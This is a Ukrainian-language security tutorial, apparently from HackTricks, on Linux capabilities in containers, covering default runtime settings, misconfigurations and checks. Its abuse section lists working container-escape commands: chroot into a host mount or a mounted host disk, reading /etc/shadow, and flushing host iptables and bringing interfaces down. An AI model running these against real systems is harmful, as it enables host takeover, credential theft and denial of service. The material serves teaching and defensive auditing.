# Можливості Linux у контейнерах

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux capabilities — одна з найважливіших складових безпеки контейнерів, оскільки вони відповідають на тонке, але фундаментальне питання: **що насправді означає "root" всередині контейнера?** На звичайній Linux-системі UID 0 історично означав дуже широкий набір привілеїв. У сучасних ядрах цей привілей розбитий на менші одиниці, які називаються capabilities. Процес може виконуватись як root і водночас не мати багатьох потужних операцій, якщо відповідні capabilities були видалені.

Контейнери сильно залежать від цього розмежування. Багато робочих навантажень все ще запускаються як UID 0 всередині контейнера з причин сумісності або простоти. Без відкидання capabilities це було б надто небезпечно. Завдяки відкиданню capabilities процес root у контейнері може виконувати багато звичайних внутрішніх завдань, але бути позбавленим більш чутливих операцій ядра. Ось чому оболонка контейнера, яка показує `uid=0(root)`, не означає автоматично "host root" або навіть "широкі привілеї ядра". Набори capabilities вирішують, наскільки цінна ця ідентичність root насправді.

Для повної довідки по Linux capabilities та багатьох прикладів зловживань див.:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Принцип роботи

Capabilities відстежуються в кількох множинах, включаючи permitted, effective, inheritable, ambient і bounding sets. Для багатьох перевірок контейнерів точна семантика ядра для кожної множини менш критична, ніж практичне питання: **які привілейовані операції цей процес може успішно виконати прямо зараз, і які майбутні підвищення привілеїв ще можливі?**

Причина, чому це важливо, полягає в тому, що багато технік виходу з контейнера насправді є проблемами capabilities, замаскованими під проблеми контейнера. Робоче навантаження з `CAP_SYS_ADMIN` отримує доступ до величезної кількості функціональності ядра, до якої процес root у контейнері зазвичай не повинен чіпати. Робоче навантаження з `CAP_NET_ADMIN` стає набагато небезпечніше, якщо воно також ділить host network namespace. Робоче навантаження з `CAP_SYS_PTRACE` стає цікавішим, якщо воно може бачити процеси хоста через спільний host PID. У Docker чи Podman це може виглядати як `--pid=host`; у Kubernetes зазвичай це з’являється як `hostPID: true`.

Іншими словами, набір capabilities не можна оцінювати окремо. Його треба читати разом з namespaces, seccomp та політиками MAC.

## Лаб

Дуже простий спосіб перевірити capabilities всередині контейнера:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Ви також можете порівняти більш обмежений контейнер з тим, до якого додані всі capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Щоб побачити вплив обмеженого додавання, спробуйте скинути все й додати назад лише одну capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ці невеликі експерименти допомагають показати, що runtime — це не просто переключення булевої змінної під назвою "privileged". Він формує реальну поверхню привілеїв, доступну процесу.

## High-Risk Capabilities

Хоча багато capabilities можуть бути важливими залежно від цілі, кілька з них регулярно відіграють ключову роль при аналізі container escape.

**`CAP_SYS_ADMIN`** — це те, що захисники мають розглядати з найбільшою підозрою. Його часто описують як "the new root", бо він відкриває величезну кількість функціональності, включно з операціями, пов’язаними з монтуванням, поведінкою, чутливою до namespace, та багатьма шляхами в ядрі, які ніколи не слід легковажно відкривати для контейнерів. Якщо контейнер має `CAP_SYS_ADMIN`, слабкий seccomp та відсутнє сильне MAC confinement, багато класичних шляхів breakout стають значно реалістичнішими.

**`CAP_SYS_PTRACE`** важливий, коли існує видимість процесів, особливо якщо PID namespace спільний з host або з цікавими сусідніми workloads. Він може перетворити видимість на можливість маніпуляції.

**`CAP_NET_ADMIN`** і **`CAP_NET_RAW`** мають значення в мережево-орієнтованих середовищах. На ізольованій bridge network вони вже можуть бути ризикованими; у спільному host network namespace ситуація значно гірша, бо workload може переналаштувати хостову мережу, sniff, spoof або заважати локальним мережевим потокам.

**`CAP_SYS_MODULE`** зазвичай є катастрофічним у rootful середовищі, оскільки завантаження kernel modules фактично дає контроль над host kernel. Воно майже ніколи не повинно з’являтися в загальнодоступних контейнерних робочих навантаженнях.

## Runtime Usage

Docker, Podman, containerd-based stacks та CRI-O всі використовують контроль capabilities, але за замовчуванням і інтерфейси управління відрізняються. Docker робить це дуже прямо через прапорці на кшталт `--cap-drop` і `--cap-add`. Podman надає схожі контролі і часто виграє від rootless виконання як додаткового рівня безпеки. Kubernetes висвітлює додавання та скидання capabilities через Pod або контейнерний `securityContext`. System-container середовища, такі як LXC/Incus, також покладаються на контроль capabilities, але ширша інтеграція з host частіше спокушає операторів більш агресивно послаблювати налаштування за замовчуванням, ніж це роблять у app-container середовищах.

Той самий принцип діє у всіх них: capability, яке технічно можливо надати, не обов’язково має бути наданим. Багато реальних інцидентів починаються тоді, коли оператор додає capability просто тому, що workload не працював у більш суворій конфігурації і команді потрібен був швидкий фікс.

## Misconfigurations

Найочевидніша помилка — це **`--cap-add=ALL`** у Docker/Podman-подібних CLI, але це не єдина помилка. На практиці частішою проблемою є надання однієї-двох надзвичайно потужних capabilities, особливо `CAP_SYS_ADMIN`, щоб "забезпечити роботу програми", не розуміючи при цьому наслідків для namespace, seccomp і монтувань. Інший поширений збій — поєднання додаткових capabilities зі спільними з host namespace. У Docker або Podman це може виглядати як `--pid=host`, `--network=host` або `--userns=host`; у Kubernetes подібне розкриття зазвичай з’являється через налаштування workload, такі як `hostPID: true` або `hostNetwork: true`. Кожне з таких поєднань змінює те, на що capability фактично впливає.

Також часто адміністратори вважають, що оскільки workload не повністю `--privileged`, воно все одно значно обмежене. Іноді це правда, але іноді ефективна позиція вже настільки близька до privileged, що це розрізнення перестає мати практичне значення.

## Abuse

Перший практичний крок — перелічити ефективний набір capabilities і відразу протестувати дії, специфічні для цих capabilities, які могли б мати значення для escape або доступу до інформації про host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Якщо присутній `CAP_SYS_ADMIN`, спочатку перевірте зловживання mount та доступ до файлової системи хоста, оскільки це один із найпоширеніших механізмів виходу:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Якщо присутній `CAP_SYS_PTRACE` і контейнер може бачити цікаві процеси, перевірте, чи цю можливість можна використати для інспекції процесів:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Якщо присутній `CAP_NET_ADMIN` або `CAP_NET_RAW`, перевірте, чи може робоче навантаження маніпулювати видимим мережевим стеком або принаймні збирати корисну мережеву розвідку:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Коли тест capability проходить успішно, поєднайте його зі станом namespace. Capability, що здається лише ризикованим в ізольованому namespace, може одразу перетворитися на escape або host-recon primitive, якщо контейнер також розділяє host PID, host network або host mounts.

### Повний приклад: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Якщо контейнер має `CAP_SYS_ADMIN` та записуваний bind mount файлової системи хоста, наприклад `/host`, шлях для escape часто буває простим:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Якщо `chroot` вдалося, команди тепер виконуються в контексті кореневої файлової системи хоста:
```bash
id
hostname
cat /etc/shadow | head
```
Якщо `chroot` недоступний, той самий результат часто можна отримати, викликавши бінарний файл через змонтоване дерево:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Повний приклад: `CAP_SYS_ADMIN` + доступ до пристрою

Якщо блоковий пристрій з хоста відкрито, `CAP_SYS_ADMIN` може перетворити його на прямий доступ до файлової системи хоста:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Повний приклад: `CAP_NET_ADMIN` + хост-мережа

Це поєднання не завжди безпосередньо дає root на хості, але воно може повністю переналаштувати мережевий стек хоста:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це може дозволити denial of service, traffic interception або доступ до сервісів, які раніше були відфільтровані.

## Перевірки

Метою capability checks є не лише виведення/dump raw values, а й з'ясувати, чи має процес достатньо привілеїв, щоб зробити його поточну ситуацію з namespace і mount небезпечною.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Що тут цікаво:

- `capsh --print` — найпростіший спосіб помітити високоризикові capabilities, такі як `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, або `cap_sys_module`.
- Рядок `CapEff` у `/proc/self/status` показує, що насправді ефективно зараз, а не тільки те, що може бути доступним в інших наборах.
- Знімок capabilities набуває набагато більшого значення, якщо контейнер також ділить із хостом PID-, network- або user namespaces, або має монтовані томи хоста з правом запису.

Після збору сирої інформації про capabilities наступний крок — інтерпретація. Запитайте, чи процес є root, чи активні user namespaces, чи host namespaces спільні, чи seccomp застосовується (enforcing), і чи AppArmor або SELinux все ще обмежують процес. Набір capabilities сам по собі — лише частина картини, але часто саме він пояснює, чому один container breakout спрацьовує, а інший зазнає невдачі з того ж начебто стартового стану.

## Значення за замовчуванням середовища виконання

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Для Kubernetes важливо, що API не визначає єдиного універсального набору capabilities за замовчуванням. Якщо Pod не додає або не відкидає capabilities, робоче навантаження успадковує runtime default для цього вузла.
{{#include ../../../../banners/hacktricks-training.md}}
